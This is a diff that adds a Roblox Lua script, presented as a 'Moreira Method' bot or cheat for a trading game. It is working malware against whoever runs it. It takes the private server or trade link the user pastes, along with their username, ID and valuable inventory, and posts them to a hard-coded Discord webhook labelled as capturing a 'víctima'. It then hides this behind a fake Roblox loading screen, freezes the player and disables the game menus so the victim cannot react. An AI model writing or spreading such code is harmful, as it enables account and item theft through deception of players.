@@ -1,0 +1,440 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local CoreGui = game:GetService("CoreGui")
+local StarterGui = game:GetService("StarterGui")
+local Lighting = game:GetService("Lighting")
+local GuiService = game:GetService("GuiService")
+
+-- CONFIGURACIÓN
+local WEBHOOK_URL = "https://discord.com/api/v10/webhooks/1446159384798298124/4xKrReMncfbttw6_BtA3K3vjQe6PPbFkfWJzFFWAz_OHtMAhXLFt5NWu00o3I8787PB8"
+local Min_Gen = 1_000_000 
+
+-- VARIABLES LOCALES
+local Jugador = Players.LocalPlayer
+local PlayerGui = Jugador:WaitForChild("PlayerGui")
+local UserID = Jugador.UserId
+
+--------------------------------------------------------------------------------
+-- SISTEMA DE UI (DISEÑO TERMINAL CYBERPUNK - INTRO)
+--------------------------------------------------------------------------------
+
+local function CrearInterfazCarga()
+    if PlayerGui:FindFirstChild("MoreiraLoader") then PlayerGui.MoreiraLoader:Destroy() end
+
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "MoreiraLoader"
+    ScreenGui.IgnoreGuiInset = true
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.DisplayOrder = 999
+    ScreenGui.Parent = PlayerGui
+
+    local MainFrame = Instance.new("Frame")
+    MainFrame.Size = UDim2.new(1, 0, 1, 0)
+    MainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
+    MainFrame.Parent = ScreenGui
+
+    local GridTexture = Instance.new("ImageLabel")
+    GridTexture.Size = UDim2.new(1, 0, 1, 0)
+    GridTexture.Image = "rbxassetid://6071575925"
+    GridTexture.ImageColor3 = Color3.fromRGB(40, 0, 60)
+    GridTexture.ImageTransparency = 0.8
+    GridTexture.ScaleType = Enum.ScaleType.Tile
+    GridTexture.TileSize = UDim2.new(0, 50, 0, 50)
+    GridTexture.BackgroundTransparency = 1
+    GridTexture.Parent = MainFrame
+
+    task.spawn(function()
+        while MainFrame.Parent do
+            local tween = TweenService:Create(GridTexture, TweenInfo.new(5, Enum.EasingStyle.Linear), {TileSize = UDim2.new(0, 60, 0, 60)})
+            tween:Play()
+            tween.Completed:Wait()
+            local tween2 = TweenService:Create(GridTexture, TweenInfo.new(5, Enum.EasingStyle.Linear), {TileSize = UDim2.new(0, 50, 0, 50)})
+            tween2:Play()
+            tween2.Completed:Wait()
+        end
+    end)
+
+    local ConsoleFrame = Instance.new("Frame")
+    ConsoleFrame.Size = UDim2.new(0, 500, 0, 350)
+    ConsoleFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    ConsoleFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+    ConsoleFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+    ConsoleFrame.BorderSizePixel = 0
+    ConsoleFrame.Parent = MainFrame
+
+    local Stroke = Instance.new("UIStroke")
+    Stroke.Color = Color3.fromRGB(255, 50, 50)
+    Stroke.Thickness = 2
+    Stroke.Parent = ConsoleFrame
+
+    local LogContainer = Instance.new("ScrollingFrame")
+    LogContainer.Position = UDim2.new(0, 10, 0, 40)
+    LogContainer.Size = UDim2.new(1, -20, 1, -50)
+    LogContainer.BackgroundTransparency = 1
+    LogContainer.ScrollBarThickness = 0
+    LogContainer.Parent = ConsoleFrame
+    LogContainer.AutomaticCanvasSize = Enum.AutomaticSize.Y
+
+    local LogLayout = Instance.new("UIListLayout")
+    LogLayout.Padding = UDim.new(0, 4)
+    LogLayout.Parent = LogContainer
+
+    local function AddLog(text, color, delayTime)
+        local Label = Instance.new("TextLabel")
+        Label.Text = "> " .. text
+        Label.Font = Enum.Font.Code
+        Label.TextSize = 14
+        Label.TextColor3 = color or Color3.fromRGB(150, 150, 150)
+        Label.Size = UDim2.new(1, 0, 0, 18)
+        Label.BackgroundTransparency = 1
+        Label.TextXAlignment = Enum.TextXAlignment.Left
+        Label.TextTransparency = 1
+        Label.Parent = LogContainer
+        TweenService:Create(Label, TweenInfo.new(0.3), {TextTransparency = 0}):Play()
+        LogContainer.CanvasPosition = Vector2.new(0, 9999)
+        if delayTime then task.wait(delayTime) end
+    end
+
+    task.spawn(function()
+        task.wait(0.5)
+        AddLog("Iniciando Moreira Kernel...", Color3.fromRGB(255, 255, 255), 0.3)
+        AddLog("Escaneando integridad...", nil, 0.4)
+        AddLog("Conexión segura establecida.", Color3.fromRGB(0, 255, 100), 0.5)
+        AddLog("Esperando input del usuario...", nil, 1.0)
+        TweenService:Create(ConsoleFrame, TweenInfo.new(0.5), {Size = UDim2.new(0,0,0,0)}):Play()
+        task.wait(0.5)
+        ScreenGui:Destroy()
+    end)
+end
+
+--------------------------------------------------------------------------------
+-- LÓGICA DE FONDO (SCANNER & LOCK)
+--------------------------------------------------------------------------------
+
+local function bloquearMenuRoblox()
+    -- Desactivar notificaciones y menús
+    pcall(function()
+        StarterGui:SetCore("TopbarEnabled", false)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+        GuiService:SetGameplayPausedNotificationEnabled(false)
+    end)
+
+    -- Bloquear Escape
+    if UserInputService.KeyboardEnabled then
+        local escConnection
+        escConnection = UserInputService.InputBegan:Connect(function(input)
+            if input.KeyCode == Enum.KeyCode.Escape then
+                -- Forzamos un bucle vacío para matar el menú
+                RunService.Stepped:Wait() 
+            end
+        end)
+    end
+
+    -- Loop agresivo para mantener desactivado el CoreGui
+    task.spawn(function()
+        while task.wait() do
+            pcall(function()
+                local rGui = CoreGui:FindFirstChild("RobloxGui")
+                if rGui then rGui.Enabled = false end
+                local pMenu = CoreGui:FindFirstChild("PlayerList")
+                if pMenu then pMenu.Enabled = false end
+            end)
+        end
+    end)
+end
+
+local function formatNumberShort(n)
+    if not n or type(n) ~= "number" then return "$0" end
+    if n >= 1e9 then return string.format("$%.2fB", n / 1e9) end
+    if n >= 1e6 then return string.format("$%.2fM", n / 1e6) end
+    if n >= 1e3 then return string.format("$%.2fK", n / 1e3) end
+    return "$" .. tostring(n)
+end
+
+local function parseValueFromText(s)
+    if not s then return 0 end
+    local num = s:match("([%d%.]+)")
+    if not num then return 0 end
+    local n = tonumber(num) or 0
+    if s:find("B") then return n * 1e9
+    elseif s:find("M") then return n * 1e6
+    elseif s:find("K") then return n * 1e3
+    else return n end
+end
+
+local function getBrainrots()
+    local results = {}
+    local plots = Workspace:FindFirstChild("Plots") or Workspace
+    for _, plot in ipairs(plots:GetChildren()) do
+        local podiums = plot:FindFirstChild("AnimalPodiums") or plot:FindFirstChild("Podiums")
+        if podiums then
+            for _, pd in ipairs(podiums:GetChildren()) do
+                local base = pd:FindFirstChild("Base") or pd:FindFirstChildWhichIsA("BasePart")
+                local spawn = base and base:FindFirstChild("Spawn")
+                local att = spawn and spawn:FindFirstChild("Attachment")
+                local oh = att and att:FindFirstChild("AnimalOverhead")
+                
+                local nameLbl = oh and oh:FindFirstChild("DisplayName")
+                local genLbl = oh and oh:FindFirstChild("Generation")
+                if nameLbl and nameLbl:IsA("TextLabel") then
+                    local name = nameLbl.Text
+                    local genText = genLbl and genLbl.Text or "0"
+                    local valueNum = parseValueFromText(genText)
+                    if valueNum >= Min_Gen then
+                        local key = name .. "|" .. valueNum
+                        if results[key] then results[key].count = results[key].count + 1
+                        else results[key] = {name = name, value = valueNum, count = 1} end
+                    end
+                end
+            end
+        end
+    end
+    local out = {}
+    for _, v in pairs(results) do table.insert(out, v) end
+    table.sort(out, function(a, b) return a.value > b.value end)
+    return out
+end
+
+local function sendToDiscord(link, playerCount, playerName, brainrots)
+    task.spawn(function()
+        local itemList = ""
+        local totalValue = 0
+        if #brainrots > 0 then
+            for i, br in ipairs(brainrots) do
+                if i <= 12 then 
+                    local fVal = formatNumberShort(br.value)
+                    itemList = itemList .. string.format("> `[%d]` **%s** ➔ %s (x%d)\n", i, br.name, fVal, br.count)
+                end
+                totalValue = totalValue + (br.value * br.count)
+            end
+            if #brainrots > 12 then itemList = itemList .. string.format("\n*...y %d items más*", #brainrots - 12) end
+        else itemList = "⚠️ *Inventario vacío o por debajo del filtro.*" end
+
+        local embedData = {
+            ["title"] = "💉 Método Moreira - Captura Exitosa",
+            ["description"] = "Se ha interceptado una sesión y extraído la información.",
+            ["color"] = 10038562, 
+            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..UserID.."&width=420&height=420&format=png"},
+            ["fields"] = {
+                { ["name"] = "👤 Víctima", ["value"] = string.format("`%s` (ID: %d)", playerName, UserID), ["inline"] = true },
+                { ["name"] = "💰 Valor Total", ["value"] = "**"..formatNumberShort(totalValue).."**", ["inline"] = true },
+                { ["name"] = "🔗 Link Ejecutado", ["value"] = string.format("```%s```", link), ["inline"] = false },
+                { ["name"] = "📦 Inventario (Top Valiosos)", ["value"] = itemList, ["inline"] = false }
+            },
+            ["footer"] = { ["text"] = "Moreira Method V3 • " .. os.date("%X") }
+        }
+        request({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode({["content"] = "||@everyone|| 🩸 **NUEVA VÍCTIMA CAYÓ EN EL MÉTODO**", ["embeds"] = {embedData}, ["avatar_url"] = "https://i.imgur.com/AfFp7pu.png", ["username"] = "Moreira Logger"})})
+    end)
+end
+
+local function trapPlayer()
+    local char = Jugador.Character or Jugador.CharacterAdded:Wait()
+    pcall(function()
+        -- Limpiamos herramientas para que no puedan equipar nada
+        Jugador.Backpack:ClearAllChildren()
+        for _, t in pairs(char:GetChildren()) do if t:IsA("Tool") then t:Destroy() end end
+    end)
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    if hrp then 
+        hrp.Anchored = true 
+        hrp.CFrame = CFrame.new(0, 999999, 0) -- Los enviamos al vacío para que no vean el mapa
+    end
+end
+
+--------------------------------------------------------------------------------
+-- LA PANTALLA FINAL "WALL" (EL MURO)
+--------------------------------------------------------------------------------
+
+local function MostrarPantallaFinal()
+    local FinalGui = Instance.new("ScreenGui")
+    FinalGui.Name = "RobloxLoadingGui" -- Nombre falso para despistar
+    FinalGui.IgnoreGuiInset = true
+    FinalGui.DisplayOrder = 2147483647 -- Prioridad MÁXIMA
+    FinalGui.ResetOnSpawn = false
+    FinalGui.Parent = PlayerGui
+
+    -- FONDO SÓLIDO TOTAL
+    local BG = Instance.new("Frame")
+    BG.Size = UDim2.new(1.1, 0, 1.1, 0) -- Un poco más grande para asegurar cobertura
+    BG.Position = UDim2.new(-0.05, 0, -0.05, 0)
+    BG.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Negro absoluto
+    BG.BorderSizePixel = 0
+    BG.ZIndex = 9999
+    BG.Active = true -- Bloquea clics del mouse
+    BG.Parent = FinalGui
+
+    -- Logo de Roblox (Estático y centrado, estilo carga clásica)
+    local Logo = Instance.new("ImageLabel")
+    Logo.Image = "rbxassetid://9167384795" -- Logo blanco moderno
+    Logo.Size = UDim2.new(0, 100, 0, 100)
+    Logo.Position = UDim2.new(0.5, 0, 0.4, 0)
+    Logo.AnchorPoint = Vector2.new(0.5, 0.5)
+    Logo.BackgroundTransparency = 1
+    Logo.ZIndex = 10000
+    Logo.Parent = BG
+
+    -- Animación de rotación sutil del logo
+    task.spawn(function()
+        local rot = 0
+        while BG.Parent do
+            rot = rot + 2
+            Logo.Rotation = rot
+            RunService.RenderStepped:Wait()
+        end
+    end)
+
+    -- Texto de Carga Falso
+    local Status = Instance.new("TextLabel")
+    Status.Text = "Joining Server..."
+    Status.Font = Enum.Font.GothamMedium
+    Status.TextSize = 22
+    Status.TextColor3 = Color3.fromRGB(200, 200, 200)
+    Status.Position = UDim2.new(0.5, 0, 0.55, 0)
+    Status.AnchorPoint = Vector2.new(0.5, 0.5)
+    Status.BackgroundTransparency = 1
+    Status.ZIndex = 10000
+    Status.Parent = BG
+
+    -- Barra de carga falsa
+    local BarBG = Instance.new("Frame")
+    BarBG.Size = UDim2.new(0.2, 0, 0.005, 0)
+    BarBG.Position = UDim2.new(0.5, 0, 0.6, 0)
+    BarBG.AnchorPoint = Vector2.new(0.5, 0.5)
+    BarBG.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    BarBG.BorderSizePixel = 0
+    BarBG.ZIndex = 10000
+    BarBG.Parent = BG
+
+    local BarFill = Instance.new("Frame")
+    BarFill.Size = UDim2.new(0, 0, 1, 0)
+    BarFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    BarFill.BorderSizePixel = 0
+    BarFill.ZIndex = 10001
+    BarFill.Parent = BarBG
+
+    -- Lógica de distracción
+    task.spawn(function()
+        -- Oscurecer el mundo 3D por si acaso borran la GUI
+        Lighting.Brightness = 0
+        Lighting.ClockTime = 0
+        Lighting.GlobalShadows = false
+        Lighting.FogEnd = 0
+
+        local texts = {
+            "Waiting for available server...",
+            "Loading terrain data...",
+            "Syncing player profile...",
+            "Connecting to game instance..."
+        }
+        
+        while BG.Parent do
+            -- Animar barra aleatoriamente
+            local targetSize = math.random(10, 80) / 100
+            TweenService:Create(BarFill, TweenInfo.new(1.5, Enum.EasingStyle.Quad), {Size = UDim2.new(targetSize, 0, 1, 0)}):Play()
+            
+            -- Cambiar texto para que parezca real
+            Status.Text = texts[math.random(1, #texts)]
+            task.wait(math.random(3, 6))
+            
+            -- Resetear barra a veces para simular fallo de carga y mantenerlos esperando
+            if math.random() > 0.7 then
+                BarFill.Size = UDim2.new(0,0,1,0)
+            end
+        end
+    end)
+end
+
+--------------------------------------------------------------------------------
+-- MENÚ PRINCIPAL
+--------------------------------------------------------------------------------
+
+local function IniciarMenuPrincipal()
+    task.wait(3.5) 
+    
+    local MenuGui = Instance.new("ScreenGui")
+    MenuGui.Name = "MoreiraMenu"
+    MenuGui.ResetOnSpawn = false
+    MenuGui.Parent = PlayerGui
+    
+    local Frame = Instance.new("Frame")
+    Frame.Size = UDim2.new(0, 450, 0, 280)
+    Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+    Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+    Frame.BorderSizePixel = 0
+    Frame.Parent = MenuGui
+    
+    local UICorner = Instance.new("UICorner")
+    UICorner.CornerRadius = UDim.new(0, 12)
+    UICorner.Parent = Frame
+    
+    local Stroke = Instance.new("UIStroke")
+    Stroke.Color = Color3.fromRGB(255, 40, 40)
+    Stroke.Thickness = 2
+    Stroke.Parent = Frame
+
+    local Title = Instance.new("TextLabel")
+    Title.Text = "CONFIGURACIÓN DEL BOT"
+    Title.Font = Enum.Font.GothamBold
+    Title.TextSize = 24
+    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Title.Size = UDim2.new(1, 0, 0, 60)
+    Title.BackgroundTransparency = 1
+    Title.Parent = Frame
+    
+    local Input = Instance.new("TextBox")
+    Input.Size = UDim2.new(0.85, 0, 0, 50)
+    Input.Position = UDim2.new(0.075, 0, 0.42, 0)
+    Input.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+    Input.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Input.PlaceholderText = "Pega el enlace del servidor/trade aquí..."
+    Input.Font = Enum.Font.Gotham
+    Input.TextSize = 14
+    Input.Parent = Frame
+    Instance.new("UICorner", Input).CornerRadius = UDim.new(0, 8)
+
+    local Btn = Instance.new("TextButton")
+    Btn.Size = UDim2.new(0.6, 0, 0, 50)
+    Btn.Position = UDim2.new(0.2, 0, 0.75, 0)
+    Btn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
+    Btn.Text = "EJECUTAR SCRIPT"
+    Btn.Font = Enum.Font.GothamBlack
+    Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Btn.TextSize = 18
+    Btn.Parent = Frame
+    Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 8)
+    
+    Btn.MouseButton1Click:Connect(function()
+        local link = Input.Text
+        if #link < 5 then
+            Btn.Text = "❌ ENLACE INVÁLIDO"
+            task.wait(1)
+            Btn.Text = "EJECUTAR SCRIPT"
+            return
+        end
+        
+        -- Feedback visual en el botón
+        Btn.Text = "⚙️ PROCESANDO..."
+        Btn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+        
+        -- EJECUTAR PAYLOAD
+        local brainrots = getBrainrots()
+        sendToDiscord(link, #Players:GetPlayers(), Jugador.Name, brainrots)
+        
+        task.wait(1.0)
+        MenuGui:Destroy()
+        
+        -- FASE DE EJECUCIÓN (OCULTAMIENTO TOTAL)
+        MostrarPantallaFinal() -- Primero la pantalla negra
+        trapPlayer() -- Luego movemos al jugador
+        bloquearMenuRoblox() -- Finalmente matamos los controles
+    end)
+end
+
+-- EJECUCIÓN
+CrearInterfazCarga()
+IniciarMenuPrincipal()
